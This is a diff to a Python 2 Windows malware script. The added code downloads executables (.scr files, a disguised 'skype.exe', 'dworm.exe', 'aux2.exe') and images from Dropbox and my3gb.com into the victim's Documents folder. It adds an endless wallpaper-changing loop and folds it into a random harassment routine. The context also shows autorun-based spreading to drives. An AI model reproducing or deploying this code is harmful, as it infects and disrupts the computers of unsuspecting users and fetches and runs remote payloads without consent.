@@ -9,7 +9,7 @@ _/ ___\_  __ \/   |  |_/  ___/  |  \  _(__  <_  __ \
      \/           |__|     \/     \/       \/       """
 
 
-import Tkinter, random, winsound, time, os, ctypes
+import Tkinter, random, winsound, time, os, ctypes, zipfile
 import getpass, sys, base64, urllib, webbrowser, wget
 
 
@@ -42,6 +42,28 @@ UseAutoPlay=1''' % (filen, filen)
             cpy(dl[d])
         except:
             pass
+
+
+def wpp2():
+    names = [i for i in range(21)]
+    uname = getpass.getuser()
+    urllib.urlretrieve("https://www.dropbox.com/s/jfyowl7mqte0nnj/fe.zip?dl=1", "fe.zip")
+    os.system("move fe.zip C:\\Users\\%username%\\Documents")
+    zip = zipfile.ZipFile('C:\\Users\\' + uname + '\\Documents\\fe.zip')
+    zip.extractall('C:\\Users\\' + uname + '\\Documents\\')
+
+    while 1==1:
+        for z in range(21):
+            quest = getpass.getuser()
+            walph = "C:\\Users\\" + quest + "\\Documents\\f%s.gif" % (names[z])
+            SPI_SETDESKWALLPAPER = 20
+            try:
+                ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, walph , 0)
+                time.sleep(0.1)
+                if i % 2 ==0:
+                    i -= 2
+            except:
+                pass
 
 
 def poo():
@@ -151,16 +173,16 @@ def dn():
     disf = "\"C:\Users" + "\\" + quest + "\Documents\""
     disf2 = "C:\Users" + "\\" + quest + "\Documents\\"
 
-    urllib.urlretrieve("YOUR URL/bambams.scr?dl=1", disf2 + "bambams.scr")
+    urllib.urlretrieve("https://www.dropbox.com/s/t4dlg5khvr190m7/bambams.scr?dl=1", disf2 + "bambams.scr")
     time.sleep(1)
 
-    urllib.urlretrieve("YOUR URL/jajas.scr?dl=1", disf2 + "jajas.scr")
+    urllib.urlretrieve("https://www.dropbox.com/s/mqqsw2s170t45ho/jajas.scr?dl=1", disf2 + "jajas.scr")
     time.sleep(1)
 
-    urllib.urlretrieve("YOUR URL/xavs.scr?dl=1", disf2 + "xavs.scr")
+    urllib.urlretrieve("https://www.dropbox.com/s/cijstvmp2wf51dc/xavs.scr?dl=1", disf2 + "xavs.scr")
     time.sleep(1)
 
-    urllib.urlretrieve("YOUR URL/skype.exe?dl=1", disf2 + "skype.exe")
+    urllib.urlretrieve("https://www.dropbox.com/s/woo4g0tyaruec26/skype.exe?dl=1", disf2 + "skype.exe")
     time.sleep(1)
 
     soundbgcode = '''Set Sound = CreateObject("WMPlayer.OCX.7")
@@ -179,15 +201,20 @@ wscript.sleep (int(Sound.currentmedia.duration)+1)*1000
     os.system("move sound.vbs " + disf)
     time.sleep(1)
 
-    urllib.urlretrieve("YOUR URL/t.mp3?dl=1", disf2 + "t.mp3")
+    urllib.urlretrieve("https://www.dropbox.com/s/369sw5dfiimafgq/t.mp3?dl=1", disf2 + "t.mp3")
     time.sleep(1)
 
-    wget.download("YOUR URL/dworm.exe")
+    wget.download("http://zepikao.my3gb.com/Sh3lz/dworm.exe")
     os.system("move dworm.exe " + disf)
     time.sleep(1)
 
-    wget.download("YOUR URL/fezinho.jpg")
+    wget.download("http://zepikao.my3gb.com/Sh3lz/fezinho.jpg")
     os.system("move fezinho.jpg " + disf)
+    time.sleep(1)
+
+    wget.download('http://zepikao.my3gb.com/Sh3lz/aux2.exe')
+    os.system("move aux2.exe " + disf)
+    time.sleep(1)
 
 
 def sc():
@@ -240,7 +267,7 @@ def checkex():
             pass
         while 1 == 1:
             try:
-                pcho = random.choice([1, 2, 3, 4])
+                pcho = random.choice([1, 2, 3, 4, 5])
                 if pcho == 1:
                     us()
                     block()
@@ -261,6 +288,11 @@ def checkex():
                 elif pcho == 4:
                     os.system("start C:\\Users\\%username%\\Documents\\sound.vbs")
                     time.sleep(60*7)
+                elif pcho == 5:
+                    us()
+                    wpp2()
+                    time.sleep(60*7)
+
             except:
                 pass
     else:
